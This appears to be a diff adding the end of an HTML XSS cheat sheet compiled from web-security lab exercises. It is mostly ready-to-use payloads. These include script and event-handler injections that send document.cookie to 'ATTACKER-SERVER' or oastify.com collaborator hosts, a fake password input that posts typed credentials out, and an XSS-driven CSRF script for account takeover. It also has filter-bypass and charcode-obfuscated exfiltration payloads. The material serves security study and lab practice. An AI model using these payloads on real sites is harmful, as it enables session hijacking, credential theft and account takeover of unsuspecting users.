+cookies</h3>
+<ul>
+<li>Inject the following payload in the vulnerable target application to
+steal a user’s session cookie. Here the “attacker server” could be burp
+collaborator for example.</li>
+</ul>
+<div class="sourceCode" id="cb36"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://ATTACKER-SERVER&#39;</span><span class="op">,</span> {</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="dt">mode</span><span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span></span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a><span class="dt">body</span><span class="op">:</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span></span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<p><br></p>
+<ul>
+<li>We can inject that “fetch” function in any event handler that
+executes JavaScript, for example:</li>
+</ul>
+<div class="sourceCode" id="cb37"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>svg onload<span class="op">=</span><span class="st">&quot;fetch(&#39;https://277ebucws3h.oastify.com&#39;, {</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>method<span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>mode<span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>body<span class="op">:</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span><span class="st">&quot;&gt;&lt;/svg&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb38"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>style<span class="op">&gt;</span>@keyframes x{}<span class="op">&lt;/</span>style<span class="op">&gt;</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>svg style<span class="op">=</span><span class="st">&quot;animation-name:x&quot;</span> onanimationend<span class="op">=</span><span class="st">&quot;fetch(&#39;https://yoqy8pwqkf.oastify.com&#39;, {</span></span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>method<span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>mode<span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>body<span class="op">:</span><span class="bu">document</span><span class="op">.</span><span class="at">domain</span></span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span><span class="st">&quot;&gt;&lt;/svg&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="use-xss-to-capture-passwords">Use XSS to capture passwords</h3>
+<ul>
+<li>Inject the following payload in the vulnerable target application to
+steal a user’s credentials. Here the “attacker server” could be burp
+collaborator for example.</li>
+</ul>
+<div class="sourceCode" id="cb39"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>input name<span class="op">=</span>username id<span class="op">=</span>username<span class="op">&gt;</span></span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>input type<span class="op">=</span>password name<span class="op">=</span>password onchange<span class="op">=</span><span class="st">&quot;if(this.value.length)fetch(&#39;https://ATTACKER-SERVER&#39;,{</span></span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a>method<span class="op">:</span><span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a>mode<span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span></span>
+<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a>body<span class="op">:</span>username<span class="op">.</span><span class="at">value</span><span class="op">+</span><span class="st">&#39;:&#39;</span><span class="op">+</span><span class="kw">this</span><span class="op">.</span><span class="at">value</span></span>
+<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span><span class="st">&quot;&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="use-xss-to-perform-csrf">Use XSS to perform CSRF</h3>
+<ul>
+<li>Inject the following payload in the vulnerable target application to
+force a user into changing their email address to test@test.com. This
+can be combined with a “Forgot Password” function to take over a user’s
+account.</li>
+</ul>
+<div class="sourceCode" id="cb40"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> req <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="at">onload</span> <span class="op">=</span> handleResponse<span class="op">;</span></span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="fu">open</span>(<span class="st">&#39;get&#39;</span><span class="op">,</span><span class="st">&#39;/my-account&#39;</span><span class="op">,</span><span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="fu">send</span>()<span class="op">;</span></span>
+<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">handleResponse</span>() {</span>
+<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> token <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="at">responseText</span><span class="op">.</span><span class="fu">match</span>(<span class="ss">/name=&quot;csrf&quot; value=&quot;</span><span class="sc">(\w+)</span><span class="ss">&quot;/</span>)[<span class="dv">1</span>]<span class="op">;</span></span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> changeReq <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span></span>
+<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a>    changeReq<span class="op">.</span><span class="fu">open</span>(<span class="st">&#39;post&#39;</span><span class="op">,</span> <span class="st">&#39;/my-account/change-email&#39;</span><span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a>    changeReq<span class="op">.</span><span class="fu">send</span>(<span class="st">&#39;csrf=&#39;</span><span class="op">+</span>token<span class="op">+</span><span class="st">&#39;&amp;email=test@test.com&#39;</span>)</span>
+<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span>
+<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h2 id="more-exploitation-payloads-and-examples">More Exploitation
+Payloads and Examples</h2>
+<ul>
+<li>Here below will be some more example payloads that were used for
+testing purposes to exfiltrate data, etc. Particularly payloads that are
+not just using the alert(1) proof-of-concept.</li>
+</ul>
+<p><br></p>
+<ul>
+<li>Vulnerable code: Our payload is included into in eval() function.
+The response type where our payload is reflected is in JSON body.</li>
+</ul>
+<div class="sourceCode" id="cb41"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">this</span><span class="op">.</span><span class="at">readyState</span> <span class="op">==</span> <span class="dv">4</span> <span class="op">&amp;&amp;</span> <span class="kw">this</span><span class="op">.</span><span class="at">status</span> <span class="op">==</span> <span class="dv">200</span>) {</span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a>            <span class="pp">eval</span>(<span class="st">&#39;var searchResultsObj = &#39;</span> <span class="op">+</span> <span class="kw">this</span><span class="op">.</span><span class="at">responseText</span>)<span class="op">;</span></span>
+<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a>            <span class="fu">displaySearchResults</span>(searchResultsObj)<span class="op">;</span></span>
+<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<ul>
+<li>Payload: The application is escaping the quotations but not the
+backslash character.</li>
+</ul>
+<div class="sourceCode" id="cb42"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a>\<span class="st">&quot;-alert(1)}//</span></span></code></pre></div>
+<ul>
+<li>An arithmetic operator (in this case the subtraction operator) is
+then used to separate the expressions before the alert() function is
+called. Finally, a closing curly bracket and two forward slashes close
+the JSON object early and comment out what would have been the rest of
+the object. As a result, the response is generated as follows:</li>
+</ul>
+<div class="sourceCode" id="cb43"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a>{<span class="st">&quot;searchTerm&quot;</span><span class="op">:</span><span class="st">&quot;</span><span class="sc">\\</span><span class="st">&quot;</span><span class="op">-</span><span class="fu">alert</span>(<span class="dv">1</span>)}<span class="co">//&quot;, &quot;results&quot;:[]}</span></span></code></pre></div>
+<ul>
+<li>Using the above context, the following payload can be used to
+exfiltrate information: (Note: The random query parameter ‘x’ was
+included so that way the document cookie will correctly be included in
+the request sent to Burp Collaborator. This behavior is similar to a
+lab, where we used the Exploit Server to exfiltrate data.)</li>
+</ul>
+<div class="sourceCode" id="cb44"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a>\<span class="st">&quot; - (document.location = &#39;https://xxxx.oastify.com/x?=&#39; + document.cookie)}//</span></span></code></pre></div>
+<p><br><br></p>
+<ul>
+<li>Payload technique was constructed from the XSS cheat sheets. This
+submits a request with user’s cookie to Burp Collaborator.</li>
+</ul>
+<div class="sourceCode" id="cb45"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span> <span class="bu">window</span>[<span class="st">&#39;document&#39;</span>][<span class="st">&#39;location&#39;</span>] <span class="op">=</span> <span class="st">&quot;https://xqr9xaoylma.oastify.com/?test1=&quot;</span> <span class="op">+</span> <span class="bu">document</span><span class="op">.</span><span class="at">cookie</span> <span class="op">+</span> <span class="st">&quot;test1&quot;</span><span class="op">;</span> <span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<ul>
+<li>Payload using the javascript protocol ( javascript:alert(1) )to send
+data over to server under our control. The “document.domain” can be
+changed to “document.cookie”, etc. After testing this it is recommended
+to just URL encode the entire payload before submitting it. (Note: the
+?test parameter used in the Burp Collaborator was required in order to
+process it correctly)</li>
+</ul>
+<div class="sourceCode" id="cb46"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a>javascript<span class="op">:</span><span class="bu">window</span>[<span class="st">&#39;document&#39;</span>][<span class="st">&#39;location&#39;</span>] <span class="op">=</span> <span class="st">&quot;https://2q9hxdl2.oastify.com/?test=&quot;</span> <span class="op">+</span> <span class="bu">document</span><span class="op">.</span><span class="at">domain</span> <span class="op">+</span> <span class="st">&quot;test123&quot;</span></span></code></pre></div>
+<p><br><br></p>
+<ul>
+<li><p>Context is within an HTML attribute and angle brackets are
+encoded:</p>
+<ul>
+<li>Note: Encoding the payload actually made it not work so it’s good to
+try many things. The closing quotation is not included since one will be
+there with the current context.</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb47"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a>test123<span class="st">&quot; onmouseover=&quot;</span>document<span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;https://xxx.oastify.com/?x=&#39;</span> <span class="op">+</span> <span class="bu">document</span><span class="op">.</span><span class="at">domain</span></span></code></pre></div>
+<p><br><br></p>
+<ul>
+<li><p>If the application is encoding angle brackets/double quotes and
+escaping single quotes, the below payloads can help bypass
+restrictions:</p>
+<ul>
+<li>Steps: Go to CyberChef and select “To Decimal” and set the Delimiter
+to “Comma”. Paste the payload results within the “String.fromCharCode()”
+function.</li>
+</ul></li>
+<li><p>Original Payload: (did not work as single quotes escaped,
+document.location did not work correctly)</p>
+<ul>
+<li>Encode the payload and use it within the String.fromCharCode()
+function.</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb48"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a>\<span class="st">&#39;; document.location =  &quot;https://3imrz0nwbl.oastify.com/?x=&quot; + document.domain + &quot;END&quot; ; //</span></span></code></pre></div>
+<ul>
+<li>Final Payload(s):</li>
+</ul>
+<div class="sourceCode" id="cb49"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a>\<span class="st">&#39;; eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,99,118,98,48,115,54,111,118,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)) ; //</span></span></code></pre></div>
+<ul>
+<li>This payload executes the document.domain:</li>
+</ul>
+<div class="sourceCode" id="cb50"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a>\<span class="st">&#39;; var x = String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110) ; alert(eval(x)) ; //</span></span></code></pre></div>
+<p><br><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li><p>LAB EXPERT Reflected XSS in a JavaScript URL with some characters
+blocked</p></li>
+<li><p>LAB EXPERT Reflected XSS with AngularJS sandbox escape without
+strings</p></li>
+<li><p>LAB EXPERT Reflected XSS with AngularJS sandbox escape and
+CSP</p></li>
+<li><p>LAB EXPERT Reflected XSS protected by very strict CSP, with
+dangling markup attack</p></li>
+<li><p>LAB EXPERT Reflected XSS protected by CSP, with CSP
+bypass</p></li>
+</ul>
+</body>
+</html>
